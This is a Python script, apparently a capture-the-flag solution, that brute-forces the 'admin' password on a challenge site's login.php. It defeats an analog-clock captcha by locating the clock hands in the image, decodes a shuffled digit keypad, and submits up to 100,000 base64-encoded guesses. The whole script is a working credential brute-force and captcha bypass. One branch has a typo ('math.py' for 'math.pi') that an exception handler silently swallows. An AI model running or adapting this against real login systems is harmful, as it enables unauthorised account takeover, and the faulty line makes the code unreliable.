import requests
import urllib.request
from PIL import Image
import base64
import math
import shutil
import time

for i in range(0,100000):
    try:
        if i%100 == 0:
            print(i)

        s = requests.Session()

        requete=s.get("http://passichronophage.chall.malicecyber.com/")

        adresse_captcha = requete.text.split('class="captcha-image" src="')[1].split('"')[0]

        r = s.get(f"http://passichronophage.chall.malicecyber.com/{adresse_captcha}", stream=True)
        if r.status_code == 200:
            with open("captcha_0.png", 'wb') as f: 
                r.raw.decode_content = True
                shutil.copyfileobj(r.raw, f)  


        image = Image.open('captcha_0.png')

        image_data = image.load()
        height,width = image.size

        for loop1 in range(height):
            for loop2 in range(width):
                r,g,b = image_data[loop1,loop2]
                if r==0 and g==0 and b==0: # noir
                    pass
                else:  # on met les autres couleurs en blanc
                    image_data[loop1,loop2] = 255, 255, 255 #blanc

        max_eloignement=[0,0,0] # distance au centre, coord 1, coord 2

        def calcul_distance(coord_1, coord_2):
            return ((coord_1-100)**2 + (coord_2-100)**2)**0.5


        def calcul_distance_points(x_1, y_1, x_2, y_2):
            return ((x_1-x_2)**2 + (y_1-y_2)**2)**0.5


        def determination_alignement(x_1, y_1, x_2, y_2, d_1, d_2):
            if abs(abs(d_1-d_2) - calcul_distance_points(x_1, y_1, x_2, y_2)) <0.3:
                return True
            return False


        # minute
        max_eloignement=[0,0,0] # distance au centre, coord 1, coord 2
        for loop1 in range(50,150): 
            for loop2 in range(50,150):
                r,g,b = image_data[loop1,loop2]
                if r==0 and g==0 and b==0:
                    if calcul_distance(loop1, loop2) >= max_eloignement[0]:
                        max_eloignement = [calcul_distance(loop1, loop2), loop1, loop2]
                
        image_data[max_eloignement[1],max_eloignement[2]] = 255, 0, 0

        # calcul de l'angle
        if max_eloignement[2] == 100 and max_eloignement[1]>= 100:
            angle = math.pi / 2
        elif max_eloignement[2] == 100 and max_eloignement[1]<= 100:
            angle = 1.5 * math.py

        elif max_eloignement[1] >= 100 and max_eloignement[2] <= 100:
            angle = math.acos(abs(max_eloignement[2]-100)/max_eloignement[0])
        elif max_eloignement[1] >= 100 and max_eloignement[2] >= 100:
            angle = math.pi - math.acos(abs(max_eloignement[2]-100)/max_eloignement[0]) 
        elif max_eloignement[1] <= 100 and max_eloignement[2] >= 100:
            angle = math.acos(abs(max_eloignement[2]-100)/max_eloignement[0]) + math.pi 
        else:
            angle = 2 * math.pi - math.acos(abs(max_eloignement[2]-100)/max_eloignement[0])
        angle_degre = (angle*180)/math.pi

        minute = round(angle_degre / 6)

        #print("angle, angle_degre, minute : ", angle, angle_degre, minute)
        #print(max_eloignement)
        #print("----")

        # heure
        max_eloignement_2=[0,0,0] # distance au centre, coord 1, coord 2
        for loop1 in range(70,130): # 70, 130 sinon
            for loop2 in range(70,130):
                if calcul_distance(loop1, loop2) <=30 and not determination_alignement(max_eloignement[1], max_eloignement[2], loop1, loop2, max_eloignement[0], calcul_distance(loop1, loop2)):
                    r,g,b = image_data[loop1,loop2]
                    if r==0 and g==0 and b==0:
                        if calcul_distance(loop1, loop2) >= max_eloignement_2[0]:
                            max_eloignement_2 = [calcul_distance(loop1, loop2), loop1, loop2]
                
        image_data[max_eloignement_2[1],max_eloignement_2[2]] = 255, 0, 0

        if max_eloignement_2[2] == 100 and max_eloignement_2[1]>= 100:
            angle = math.pi / 2
        elif max_eloignement_2[2] == 100 and max_eloignement_2[1]<= 100:
            angle = 1.5 * math.pi
        elif max_eloignement_2[1] >= 100 and max_eloignement_2[2] <= 100:
            angle = math.acos(abs(max_eloignement_2[2]-100)/max_eloignement_2[0])
        elif max_eloignement_2[1] >= 100 and max_eloignement_2[2] >= 100:
            angle = math.pi - math.acos(abs(max_eloignement_2[2]-100)/max_eloignement_2[0]) 
        elif max_eloignement_2[1] <= 100 and max_eloignement_2[2] >= 100:
            angle = math.acos(abs(max_eloignement_2[2]-100)/max_eloignement_2[0]) + math.pi 
        else:
            angle = 2 * math.pi - math.acos(abs(max_eloignement_2[2]-100)/max_eloignement_2[0])

        angle_degre = (angle*180)/math.pi

        if angle_degre / 30 - int(angle_degre / 30) >= 0.75 and (minute > 45 or minute < 15):
            heure = round(angle_degre / 30) 
            heure = heure % 12
            #print("modif custom 126 : ", heure)
        else:
            heure = int(angle_degre / 30)

        if (angle_degre / 30) - heure < 0.3 and minute > 45:
            heure -= 1 
            heure = heure %12

        # if (angle_degre / 30) - heure < 0.3 and minute < 15:
        #     heure += 1 %12
        #     print("modification custom heure plus")

        #print("angle, angle_degre, heure", angle, angle_degre, heure)

        #print("alignement : ", max_eloignement[0]- max_eloignement_2[0], calcul_distance_points(max_eloignement[1], max_eloignement[2], max_eloignement_2[1], max_eloignement_2[2]))

        #print("----")
        #print("il est :", heure, minute)


        #print(requete.text)

        # etape d'envoi requête post 

        dico_conversion = {}

        dico_conversion[requete.text.split('<div data-pos="0">')[1][0]] = "0"
        dico_conversion[requete.text.split('<div data-pos="1">')[1][0]] = "1"
        dico_conversion[requete.text.split('<div data-pos="2">')[1][0]] = "2"
        dico_conversion[requete.text.split('<div data-pos="3">')[1][0]] = "3"
        dico_conversion[requete.text.split('<div data-pos="4">')[1][0]] = "4"
        dico_conversion[requete.text.split('<div data-pos="5">')[1][0]] = "5"
        dico_conversion[requete.text.split('<div data-pos="6">')[1][0]] = "6"
        dico_conversion[requete.text.split('<div data-pos="7">')[1][0]] = "7"
        dico_conversion[requete.text.split('<div data-pos="8">')[1][0]] = "8"
        dico_conversion[requete.text.split('<div data-pos="9">')[1][0]] = "9"
        #print(dico_conversion)

        list_heure = ""
        if heure <= 9:
            list_heure+="0"
        list_heure+=str(heure)
        if minute <= 9:
            list_heure+="0"
        list_heure+=str(minute)

        #print(list_heure)

        string_heure_converti = ""

        for k in list_heure:
            string_heure_converti += dico_conversion[k]


        #print(string_heure_converti)

        admin = base64.b64encode('admin'.encode())

        password_string = "0" * (5 - len(str(i))) + str(i)
        #print(password_string)

        password=base64.b64encode(password_string.encode())
        captcha=base64.b64encode(string_heure_converti.encode())

        #print(admin, password, captcha)

        post_request = s.post("http://passichronophage.chall.malicecyber.com/login.php", data={"username":admin, "password":password, "captcha":captcha})

        #print(post_request.text)

        if not "Bad username/password" in post_request.text:
            print("ERREUR, password :  ", i)
            print("heure, minute : ", heure, minute)
            print("dico_conversion", dico_conversion)
            print("string_heure_converti : ", string_heure_converti)
            print("angle_degre / 30", angle_degre / 30)

            if not "Wrong captcha" in post_request.text:
                
                print(post_request.text)
                print("TROUVE")
                print(i)
                break

            with open("error.txt", "a") as f:
                f.write(str(i)+"\n")
            continue

    except Exception as e:
        print(e)
        with open("error.txt", "a") as f:
                f.write(str(i)+"\n")

